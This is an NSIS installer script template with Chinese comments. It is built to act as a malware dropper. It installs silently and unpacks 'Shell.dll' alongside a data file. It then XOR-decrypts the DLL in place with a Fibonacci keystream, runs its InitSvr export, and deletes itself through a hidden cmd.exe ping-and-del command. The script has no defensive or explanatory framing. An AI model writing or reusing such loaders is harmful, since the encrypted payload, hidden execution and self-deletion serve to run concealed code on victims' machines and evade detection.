!include "LogicLib.nsh"
Name "Test"

; 生成的单个安装执行文件

OutFile "../Setup.exe"
SetCompressor /SOLID lzma

; 缺省安装目录

InstallDir "%s"

; 静默安装
Silentinstall Silent
;--------------------------------

; 安装内容

Section "RC"

	SectionIn RO

	; 设置安装目录.

	SetOutPath $INSTDIR

	; 要打包安装的文件
	File "Shell.dll"
	File "svtlogo.dat"
	; 解密文件
	FileOpen $R1 "$INSTDIR\Shell.dll" "a"
	
	;初始化循环异或变量
	IntOp $1 3 + 0
	IntOp $2 5 + 0
	IntOp $3 0 + 0
	
	;开始斐波那契异或解密
	${For} $R3 0 %d
	
		IntOp $3 $1 + $2
		IntOp $3 $3 % 255
		
		FileReadByte $R1 $R2
		FileSeek $R1 -1 CUR
		IntOp $R2 $R2 ^ $3
		FileWriteByte $R1 $R2
		
		IntOp $1 $2 + 0
		IntOp $2 $3 + 0
	
;		IntOp $R3 $R3 + 1
	
	${Next}

	FileClose $R1

	;自删除 发现不能适应带空格的路径
	System::Call '$INSTDIR\Shell.dll::InitSvr()'
	System::Call 'kernel32::GetModuleFileName(i 0,t .R1,i 1024)'
	ExecShell "open" "cmd.exe" "/c ping 127.0.0.1&del $\"$R1$\"" SW_HIDE

SectionEnd